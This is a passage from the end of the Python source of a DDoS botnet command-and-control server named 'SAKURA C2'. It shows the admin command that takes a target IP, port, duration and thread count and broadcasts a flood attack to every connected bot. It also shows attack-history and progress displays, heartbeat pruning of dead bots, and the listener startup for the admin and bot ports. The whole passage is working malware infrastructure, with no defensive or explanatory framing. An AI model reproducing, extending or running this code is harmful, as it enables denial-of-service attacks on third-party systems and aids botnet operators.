            pct = min(100, (elapsed / a.duration) * 100) if a.duration else 100
            bar_len = 20
            filled = int(bar_len * pct / 100)
            bar = f"{RED}{'#' * filled}{GREY}{'-' * (bar_len - filled)}{RST}"
            self.send_to_admin(admin,
                f"\r\n  {PINK}{a.method.upper()}{RST} {GREY}->{RST} {WHITE}{a.target}:{a.port}{RST}"
                f"  [{bar}] {WHITE}{pct:.0f}%{RST}  {GREY}{fmt_duration(remaining)} left{RST}"
                f"  {GREY}x{a.threads}t x{a.bots_sent}b{RST}"
            )

    def _cmd_history(self, admin):
        if not self.attack_history:
            self.send_to_admin(admin, f"\r\n {GREY}No attacks in history.{RST}")
            return

        widths = [10, 8, 20, 8, 8, 8]
        headers = ["Time", "Method", "Target", "Dur", "Thrd", "Bots"]
        self.send_to_admin(admin, "\r\n" + box_line("╔", "═", "╦", "╗", widths))
        self.send_to_admin(admin, "\r\n" + table_row(headers, widths, [WHITE]*6))
        self.send_to_admin(admin, "\r\n" + box_line("╠", "═", "╬", "╣", widths))

        for a in self.attack_history[-20:]:
            status_color = RED if a.active else LGREY
            self.send_to_admin(admin, "\r\n" + table_row([
                fmt_time(a.start_time),
                a.method.upper(),
                f"{a.target}:{a.port}",
                fmt_duration(a.duration),
                str(a.threads),
                str(a.bots_sent),
            ], widths, [LGREY, status_color, WHITE, LGREY, LGREY, LGREY]))

        self.send_to_admin(admin, "\r\n" + box_line("╚", "═", "╩", "╝", widths))

    # ─── ATTACK DISPATCH ───

    def _cmd_l4_attack(self, admin, parts, method):
        if len(parts) < 4:
            self.send_to_admin(admin,
                f"\r\n {RED}[x]{RST} {GREY}Usage:{RST} !{method} <ip> <port> <time> [threads]"
            )
            return
        target = parts[1]
        port = int(parts[2])
        duration = min(int(parts[3]), MAX_ATTACK_TIME)
        threads = int(parts[4]) if len(parts) >= 5 else 1
        self._send_attack(admin, method, target, port, duration, threads)

    def _send_attack(self, admin, method, target, port, duration, threads):
        cmd = {
            "type": "attack",
            "method": method,
            "target": target,
            "port": port,
            "duration": duration,
            "threads": threads,
        }

        sent = 0
        with self.lock:
            for b in list(self.bots.values()):
                if self.send_to_bot(b, cmd):
                    sent += 1
            self.total_attacks += 1
            record = AttackRecord(method, target, port, duration, threads, sent)
            self.attack_history.append(record)

        if sent == 0:
            self.send_to_admin(admin,
                f"\r\n {RED}[x]{RST} {GREY}No bots available.{RST}"
            )
            return

        self.broadcast_admin(
            f"\r\n {RED}[!]{RST} {WHITE}Attack launched{RST}"
            f"\r\n    {GREY}Method:{RST}    {PINK}{method.upper()}{RST}"
            f"\r\n    {GREY}Target:{RST}    {WHITE}{target}:{port}{RST}"
            f"\r\n    {GREY}Duration:{RST}  {WHITE}{duration}s{RST}"
            f"\r\n    {GREY}Threads:{RST}   {WHITE}{threads}{RST}"
            f"\r\n    {GREY}Bots:{RST}      {WHITE}{sent}{RST}"
        )
        self.broadcast_title()

        def _expire():
            time.sleep(duration)
            record.active = False
            self.broadcast_admin(
                f"\r\n {GREY}[#]{RST} {LGREY}Attack finished:{RST} "
                f"{PINK}{method.upper()}{RST} {GREY}->{RST} {WHITE}{target}{RST}"
            )
            self.broadcast_prompt()
            self.broadcast_title()
        threading.Thread(target=_expire, daemon=True).start()

    # ─── HEARTBEAT ───

    def heartbeat_loop(self):
        while True:
            time.sleep(PING_INTERVAL)
            with self.lock:
                dead = []
                for bid, b in self.bots.items():
                    if time.time() - b.last_ping > BOT_TIMEOUT:
                        dead.append(bid)
                    else:
                        self.send_to_bot(b, {"type": "ping"})
                for bid in dead:
                    b = self.bots.pop(bid, None)
                    if b:
                        try:
                            b.sock.close()
                        except Exception:
                            pass
                        print(f"[-] Bot {bid} timed out")
            if dead:
                self.broadcast_title()

    def title_loop(self):
        while True:
            time.sleep(5)
            self.broadcast_title()

    # ─── MAIN ───

    def run(self):
        print(f"\n{DRED}{'═'*50}{RST}")
        print(f"  {PINK}SAKURA{RST} {GREY}C2 Server{RST}")
        print(f"  {GREY}Admin:{RST} {WHITE}:{ADMIN_PORT}{RST}  {GREY}|{RST}  {GREY}Bots:{RST} {WHITE}:{BOT_PORT}{RST}")
        print(f"  {GREY}Encryption:{RST} {GREEN}XOR{RST}")
        print(f"{DRED}{'═'*50}{RST}\n")

        threading.Thread(target=self.bot_listener, daemon=True).start()
        threading.Thread(target=self.admin_listener, daemon=True).start()
        threading.Thread(target=self.heartbeat_loop, daemon=True).start()
        threading.Thread(target=self.title_loop, daemon=True).start()

        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print(f"\n{GREY}[*] Shutting down.{RST}")
            sys.exit(0)


if __name__ == "__main__":
    C2Server().run()
